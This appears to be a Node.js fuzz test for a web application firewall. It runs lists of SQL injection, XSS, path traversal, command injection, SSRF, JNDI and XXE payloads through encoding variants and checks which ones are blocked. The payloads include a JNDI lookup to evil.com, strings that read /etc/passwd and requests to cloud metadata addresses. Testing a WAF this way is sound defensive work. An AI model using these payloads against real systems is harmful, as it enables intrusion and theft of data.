/**
 * WAF 模糊测试（进程内直调，无网络限流干扰）
 * 模拟 express 解析后的 req.query/body 传给 waf 中间件，判定拦截/放行
 * 用法：node test/waf-fuzz.js
 */
const { waf } = require('../src/middleware/waf');

// ---------- 编码器 ----------
const enc1 = (s) => encodeURIComponent(s);
const enc2 = (s) => encodeURIComponent(encodeURIComponent(s));
const enc3 = (s) => encodeURIComponent(encodeURIComponent(encodeURIComponent(s)));
const ent = (s) => s.replace(/[<>"'&]/g, (ch) => ({ '<': '&#60;', '>': '&#62;', '"': '&#34;', "'": '&#39;', '&': '&#38;' }[ch]));
const uesc = (s) => s.replace(/[a-z]/gi, (ch) => `\\u${ch.charCodeAt(0).toString(16).padStart(4, '0')}`);
const full = (s) => s.replace(/[A-Za-z0-9]/g, (ch) => String.fromCharCode(ch.charCodeAt(0) + 0xfee0));
const hexCase = (s) => s.split('').map((ch) => (/[a-f]/i.test(ch) ? (Math.random() < 0.5 ? ch.toUpperCase() : ch) : ch)).join('');
/** 模拟 express URL 解析：解码一次（与 qs 行为一致） */
const parseOnce = (v) => {
  try { return decodeURIComponent(v); } catch (e) { return v; }
};

function variants(payload) {
  return [
    payload,
    enc1(payload),
    enc2(payload),
    enc3(payload),
    ent(payload),
    uesc(payload),
    full(payload),
    enc1(full(payload)),
    hexCase(enc2(payload)),
    enc1(ent(payload)),
    enc2(ent(payload)),
    ent(enc1(payload)),
    enc1(uesc(payload)),
    payload.replace(/\s+/g, '\t'),
    payload.replace(/\s+/g, '\n'),
    payload.replace(/\s+/g, '\v'),
    payload.replace(/\s+/g, '\\t'),
  ];
}

const SQL_PAYLOADS = [
  "union select 1,2,3",
  "union all select password from users",
  "1' or '1'='1",
  "1' or 1=1 --",
  "'; drop table users; --",
  "1' union select username,password from admin --",
  "admin'--",
  "' or 1=1#",
  "1 and sleep(5)",
  "1; select pg_sleep(5)",
  "1' waitfor delay '0:0:5' --",
  "1) or (1=1",
  "1' and extractvalue(1,concat(0x7e,user())) --",
  "1'||(select load_file('/etc/passwd'))||'",
  "1' having 1=1 --",
  "1' group by 1,2,3 having 1=1 --",
  "1' into outfile '/tmp/x.php' --",
  "1/**/union/**/select/**/1",
  "1' union select @@version --",
  "1' and 1=1 and (select count(*) from information_schema.tables)>0 --",
  "0x61646d696e",
];
const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg/onload=alert(1)>",
  "javascript:alert(1)",
  "<iframe src=javascript:alert(1)>",
  "\" onmouseover=\"alert(1)",
  "'><script>alert(document.cookie)</script>",
  "<details open ontoggle=alert(1)>",
  "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
  "javascript&#58;alert(1)",
  "&#106;avascript:alert(1)",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<svg><animate onbegin=alert(1)>",
  "<svg><set attributeName=\"onload\" to=\"alert(1)\">",
  "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
];
const TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..%2f..%2f..%2fetc%2fpasswd",
  "..\\..\\..\\windows\\win.ini",
  "....//....//etc/passwd",
  "..%252f..%252fetc/passwd",
  "/etc/passwd%00.png",
  "..%c0%af..%c0%afetc/passwd",
];
const CMD_PAYLOADS = [
  "; cat /etc/passwd",
  "| whoami",
  "`id`",
  "$(id)",
  "$(cat /etc/passwd)",
  "&& dir",
  "|| echo pwned",
  "id",
  "1;id",
  "$IFS;cat$IFS/etc/passwd",
];
const SSRF_PAYLOADS = [
  "http://127.0.0.1:3306",
  "http://169.254.169.254/latest/meta-data/",
  "http://0x7f000001/",
  "http://2130706433/",
  "http://0177.0.0.1/",
  "http://[::1]/",
  "http://localhost:3000/api/health",
  "file:///etc/passwd",
  "gopher://127.0.0.1:6379/_INFO",
  "http://10.0.0.1/admin",
  "http://[::ffff:127.0.0.1]/",
];
const OTHER_PAYLOADS = [
  "${jndi:ldap://evil.com/a}",
  "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
  "${7*7}",
  "#{7*7}",
  "%{#_memberAccess}",
  "{{7*7}}",
  "{{config}}",
  "a\r\nSet-Cookie: evil=1",
  "GET / HTTP/1.1\r\nHost: evil",
  "__proto__[polluted]=1",
  "constructor.prototype.x=1",
  "{\"@type\":\"java.lang.Runtime\"}",
  "<% exec(\"id\") %>",
  "{{7*'7'}}",
];

/** 构造假 req（仅 query 攻击面） */
function mkReq(searchValue) {
  const query = {};
  query.search = parseOnce(searchValue);
  return {
    ip: '127.0.0.99',
    method: 'GET',
    path: '/api/articles',
    originalUrl: '/api/articles?search=' + searchValue,
    headers: { 'user-agent': 'Mozilla/5.0 Chrome/120 Safari/537.36' },
    query,
    body: {},
  };
}

function run() {
  const all = [
    ...SQL_PAYLOADS.map((p) => [`SQL`, p]),
    ...XSS_PAYLOADS.map((p) => [`XSS`, p]),
    ...TRAVERSAL_PAYLOADS.map((p) => [`TRAV`, p]),
    ...CMD_PAYLOADS.map((p) => [`CMD`, p]),
    ...SSRF_PAYLOADS.map((p) => [`SSRF`, p]),
    ...OTHER_PAYLOADS.map((p) => [`MISC`, p]),
  ];
  let total = 0, blocked = 0;
  const misses = [];
  for (const [cat, payload] of all) {
    const vs = variants(payload);
    for (let vi = 0; vi < vs.length; vi++) {
      total++;
      const req = mkReq(vs[vi]);
      let passed = false;
      const res = {
        set: () => {},
        status: () => ({ json: () => { /* 拦截 */ } }),
      };
      waf(req, res, () => { passed = true; });
      if (passed) {
        // 放行 —— 但部分载荷本身无害（如 "id" 单词）；仅当原始载荷含攻击关键字才算绕过
        misses.push(`${cat}: ${payload.slice(0, 45)} [变体${vi}] ${JSON.stringify(vs[vi]).slice(0, 60)}`);
      } else {
        blocked++;
      }
    }
  }
  console.log(`总计 ${total} 变体 | WAF 拦截 ${blocked} | 放行 ${total - blocked}`);
  if (misses.length) {
    console.log('放行明细（需人工判断是否真绕过）:');
    misses.forEach((m) => console.log('  →', m));
  } else {
    console.log('全部拦截 ✓');
  }
}

run();
